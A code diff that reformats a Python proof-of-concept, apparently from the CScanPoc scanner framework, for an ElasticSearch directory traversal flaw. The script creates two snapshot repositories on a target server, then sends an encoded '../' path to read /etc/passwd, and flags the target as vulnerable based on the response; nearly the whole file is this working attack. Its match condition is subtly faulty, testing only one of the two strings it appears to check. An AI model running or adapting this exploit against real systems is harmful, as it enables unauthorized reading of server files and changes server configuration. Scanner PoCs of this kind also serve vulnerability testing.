@@ -4,6 +4,7 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import json
 
+
 class Vuln(ABVuln):
     vuln_id = 'ElasticSearch_0004_p'  # 平台漏洞编号，留空
     name = 'ElasticSearch 目录穿越漏洞'  # 漏洞名称
@@ -32,15 +33,16 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             data1 = '''{
                 "type": "fs",
                 "settings": {
                     "location": "/usr/share/elasticsearch/repo/test" 
                 }
             }'''
-            r1 = requests.put('{target}/_snapshot/test'.format(target=self.target), data=data1)
-            #print(r1.text)
+            r1 = requests.put(
+                '{target}/_snapshot/test'.format(target=self.target), data=data1)
+            # print(r1.text)
 
             data2 = '''{
                 "type": "fs",
@@ -48,13 +50,15 @@ class Poc(ABPoc):
                     "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata" 
                 }
             }'''
-            
-            r2 = requests.put('{target}/_snapshot/test2'.format(target=self.target), data=data2)
-            #print(r2.text)
+
+            r2 = requests.put(
+                '{target}/_snapshot/test2'.format(target=self.target), data=data2)
+            # print(r2.text)
 
             payload = '/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
-            r = requests.get('{target}{params}'.format(target=self.target, params=payload))
-            #print(r.text)
+            r = requests.get('{target}{params}'.format(
+                target=self.target, params=payload))
+            # print(r.text)
             if 'offset='and'length=' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -64,6 +68,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
